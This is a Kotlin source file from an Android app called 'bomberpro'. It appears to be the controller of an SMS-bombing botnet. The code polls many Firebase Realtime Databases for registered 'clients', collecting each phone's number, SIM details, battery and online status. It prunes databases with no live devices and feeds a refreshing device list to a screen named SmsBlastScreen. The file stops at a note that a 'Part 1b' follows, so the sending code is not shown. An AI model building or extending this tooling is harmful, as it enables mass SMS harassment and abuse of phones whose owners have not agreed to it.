package com.sanji.bomberpro.services

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.FirebaseNode
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.Dispatcher
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

data class Device(
    val firebaseUrl: String,
    val firebaseLabel: String,
    val firebaseId: String,
    val deviceId: String,
    val deviceName: String,
    val phone: String?,
    val battery: Int?,
    val sims: List<Map<String, Any?>>,
    val shortId: String,
    val lastSeen: Long,
    val model: String? = null,
    val android: String? = null,
)

data class SendResult(
    val ok: Boolean,
    val deviceId: String,
    val firebaseUrl: String,
    val error: String? = null,
)

data class FirebaseTestResult(
    val firebaseId: String,
    val firebaseLabel: String,
    val firebaseUrl: String = "",
    val httpStatus: Int,
    val totalClients: Int,
    val onlineClients: Int,
    val error: String? = null,
)

data class KillDeadResult(
    val tested: Int = 0,
    val deleted: Int = 0,
    val kept: Int = 0,
    val errors: Int = 0,
    val deletedIds: List<String> = emptyList(),
    val testedResults: List<FirebaseTestResult> = emptyList(),
)

class RealtimeDbService {

    private val http: OkHttpClient = run {
        val dispatcher = Dispatcher().apply {
            maxRequests = 400
            maxRequestsPerHost = 400
        }
        OkHttpClient.Builder()
            .connectTimeout(4, TimeUnit.SECONDS)
            .readTimeout(6, TimeUnit.SECONDS)
            .writeTimeout(4, TimeUnit.SECONDS)
            .callTimeout(8, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .dispatcher(dispatcher)
            .build()
    }

    private val heavyHttp: OkHttpClient = run {
        val dispatcher = Dispatcher().apply {
            maxRequests = 20
            maxRequestsPerHost = 20
        }
        OkHttpClient.Builder()
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .writeTimeout(8, TimeUnit.SECONDS)
            .callTimeout(30, TimeUnit.SECONDS)
            .retryOnConnectionFailure(false)
            .dispatcher(dispatcher)
            .build()
    }

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()
    private val pathCache = ConcurrentHashMap<String, String>()

    companion object {
        private const val TAG = "RealtimeDbService"

        private const val SCAN_CACHE_MS = 10 * 60 * 1000L
        private const val EMPTY_SCAN_CACHE_MS = 15 * 1000L

        private const val TOTAL_SCAN_TIMEOUT_MS = 60_000L
        private const val CLIENTS_JSON_TIMEOUT_MS = 5_000L
        private const val FULL_FETCH_TIMEOUT_MS = 10_000L
        private const val FULL_FETCH_MAX_BYTES = 20L * 1024L * 1024L
        private const val GLOBAL_DEVICE_CONCURRENCY = 400
        private const val PER_FIREBASE_CONCURRENCY = 100
        private const val BATCH_SIZE = 100
        private const val ONLINE_WINDOW_SEC = 600L

        private val scanCache = ConcurrentHashMap<String, ScanCache>()

        private fun cacheKey(firebases: List<FirebaseNode>): String =
            firebases.joinToString(",") { "${it.id}|${it.url}" }

        private data class ScanCache(
            val devices: List<Device>,
            val ts: Long,
        )
    }

    // ============================================================
    //  FIREBASES
    // ============================================================
    suspend fun loadFirebases(): List<FirebaseNode> = withContext(Dispatchers.IO) {
        try {
            val snap = FirebaseFirestore.getInstance()
                .collection(FirebaseConfig.COL_FIREBASES)
                .get().await()

            val list = snap.documents.mapNotNull { doc ->
                val url = doc.getString("url") ?: return@mapNotNull null
                if (url.isBlank()) return@mapNotNull null
                val enabled = doc.getBoolean("enabled") ?: true
                if (!enabled) return@mapNotNull null
                FirebaseNode(
                    id = doc.id,
                    url = url,
                    label = doc.getString("label") ?: "Firebase",
                    enabled = true,
                )
            }

            if (list.isNotEmpty()) list
            else FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        } catch (e: Exception) {
            Log.w(TAG, "loadFirebases failed", e)
            FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        }
    }

    // ============================================================
    //  TEST SINGLE FIREBASE
    // ============================================================
    suspend fun testFirebase(fb: FirebaseNode): FirebaseTestResult = withContext(Dispatchers.IO) {
        val baseUrl = fb.url.trimEnd('/')
        val clientsUrl = "$baseUrl/clients.json?shallow=true"

        val clientIds: List<String>
        try {
            val req = Request.Builder()
                .url(clientsUrl)
                .header("Accept", "application/json")
                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
                .get().build()
            val result = http.newCall(req).execute().use { resp ->
                val body = resp.body?.string()?.trim() ?: ""
                when {
                    !resp.isSuccessful -> Pair(
                        when (resp.code) {
                            401 -> "Auth required (rules block read)"
                            403 -> "Forbidden (rules block access)"
                            404 -> "Not found (wrong URL?)"
                            429 -> "Rate limited"
                            in 500..599 -> "Server error ${resp.code}"
                            else -> "HTTP ${resp.code}"
                        },
                        emptyList<String>(),
                    )
                    body.isEmpty() || body == "null" -> Pair(
                        "Empty — no clients registered",
                        emptyList<String>(),
                    )
                    else -> {
                        val ids = mutableListOf<String>()
                        try {
                            val obj = JSONObject(body)
                            val keys = obj.keys()
                            while (keys.hasNext()) ids.add(keys.next())
                        } catch (_: Exception) {}
                        Pair(null, ids)
                    }
                }
            }
            val err = result.first
            clientIds = result.second
            if (err != null) {
                return@withContext FirebaseTestResult(
                    firebaseId = fb.id,
                    firebaseLabel = fb.label,
                    firebaseUrl = fb.url,
                    httpStatus = 0,
                    totalClients = 0,
                    onlineClients = 0,
                    error = err,
                )
            }
        } catch (e: Exception) {
            return@withContext FirebaseTestResult(
                firebaseId = fb.id,
                firebaseLabel = fb.label,
                firebaseUrl = fb.url,
                httpStatus = 0,
                totalClients = 0,
                onlineClients = 0,
                error = "Network: ${e.message ?: e.javaClass.simpleName}",
            )
        }

        val onlineCounter = AtomicInteger(0)
        val sem = Semaphore(50)

        coroutineScope {
            clientIds.map { devId ->
                async(Dispatchers.IO) {
                    try {
                        sem.withPermit {
                            val obj = fetchDeviceObject(fb, devId) ?: return@withPermit
                            if (isOnline(obj)) onlineCounter.incrementAndGet()
                        }
                    } catch (_: Exception) {}
                }
            }.awaitAll()
        }

        val online = onlineCounter.get()
        val total = clientIds.size
        val errMsg: String? = when {
            online > 0 -> null
            total == 0 -> "No clients registered"
            online == 0 -> "$total registered, 0 online (all dead)"
            else -> null
        }

        FirebaseTestResult(
            firebaseId = fb.id,
            firebaseLabel = fb.label,
            firebaseUrl = fb.url,
            httpStatus = 200,
            totalClients = total,
            onlineClients = online,
            error = errMsg,
        )
    }

    // ============================================================
    //  TEST ALL FIREBASES
    // ============================================================
    suspend fun testAllFirebases(
        firebases: List<FirebaseNode>,
        onProgress: ((index: Int, total: Int, result: FirebaseTestResult) -> Unit)? = null,
    ): List<FirebaseTestResult> = withContext(Dispatchers.IO) {
        val results = java.util.Collections.synchronizedList(mutableListOf<FirebaseTestResult>())
        val counter = AtomicInteger(0)
        val total = firebases.size
        val sem = Semaphore(10) // limit concurrent firebase tests

        coroutineScope {
            firebases.map { fb ->
                async(Dispatchers.IO) {
                    sem.withPermit {
                        val res = testFirebase(fb)
                        results.add(res)
                        val idx = counter.incrementAndGet()
                        onProgress?.invoke(idx, total, res)
                    }
                }
            }.awaitAll()
        }
        results.toList()
    }

    // ============================================================
    //  KILL DEAD FIREBASES
    // ============================================================
    /**
     * Test all firebases, delete those that are:
     *  - 0 online clients (all devices dead), OR
     *  - have any error (network / auth / wrong URL)
     *
     * Returns report. Deleting is done via AdminService.
     */
    suspend fun findDeadFirebases(
        firebases: List<FirebaseNode>,
        onProgress: ((index: Int, total: Int, result: FirebaseTestResult) -> Unit)? = null,
    ): Pair<List<FirebaseTestResult>, List<String>> = withContext(Dispatchers.IO) {
        val results = testAllFirebases(firebases, onProgress)
        val deadIds = results
            .filter { r ->
                r.onlineClients == 0 || r.error != null
            }
            .map { it.firebaseId }
        results to deadIds
    }

    // ============================================================
    //  AUTO-SCAN FLOW
    // ============================================================
    /**
     * Emits device list every `intervalMs` while collected.
     * Used by HomeScreen + SmsBlastScreen for automatic device scan.
     * First emission is immediate (cache or fresh).
     */
    fun observeDevicesFlow(
        firebases: List<FirebaseNode>,
        intervalMs: Long = 30_000L,
    ): Flow<List<Device>> = flow {
        if (firebases.isEmpty()) {
            emit(emptyList())
            return@flow
        }
        // Immediate first emission (uses cache if fresh)
        try {
            emit(scanAll(firebases, forceRefresh = false))
        } catch (_: Exception) {
            emit(emptyList())
        }

        // Then poll
        while (currentCoroutineContext().isActive) {
            delay(intervalMs)
            try {
                val devices = scanAll(firebases, forceRefresh = true)
                emit(devices)
            } catch (_: CancellationException) {
                throw CancellationException()
            } catch (_: Exception) {
                // keep going
            }
        }
    }

    // ============================================================
    //  SCAN ALL
    // ============================================================
    suspend fun scanAll(
        firebases: List<FirebaseNode>,
        forceRefresh: Boolean = false,
        onProgress: ((index: Int, devicesFound: Int) -> Unit)? = null,
    ): List<Device> = withContext(Dispatchers.IO) {
        if (firebases.isEmpty()) return@withContext emptyList<Device>()

        val key = cacheKey(firebases)
        val cached = scanCache[key]

        if (!forceRefresh && cached != null) {
            val age = System.currentTimeMillis() - cached.ts
            val maxAge = if (cached.devices.isEmpty()) EMPTY_SCAN_CACHE_MS else SCAN_CACHE_MS
            if (age < maxAge) {
                Log.d(TAG, "scanAll: CACHE HIT — ${cached.devices.size} devices")
                onProgress?.invoke(firebases.size - 1, cached.devices.size)
                return@withContext cached.devices
            }
        }

        val allFound = java.util.Collections.synchronizedList(mutableListOf<Device>())
        val globalSem = Semaphore(GLOBAL_DEVICE_CONCURRENCY)
        var completed = false

        withTimeoutOrNull(TOTAL_SCAN_TIMEOUT_MS) {
            coroutineScope {
                firebases.mapIndexed { idx, fb ->
                    async(Dispatchers.IO) {
                        try {
                            scanFirebase(
                                fb = fb,
                                globalSem = globalSem,
                                onDevice = { dev ->
                                    allFound.add(dev)
                                    onProgress?.invoke(idx, allFound.size)
                                },
                            )
                        } catch (e: CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
                        }
                    }
                }.awaitAll()
            }
            completed = true
        } ?: Log.w(TAG, "scanAll timeout — preserving ${allFound.size} partial device(s)")

        val final = allFound.toList()

        if (completed) {
            scanCache[key] = ScanCache(final, System.currentTimeMillis())
        }
        final
    }

    // PART 1a ENDS HERE — Part 1b follows in next message
}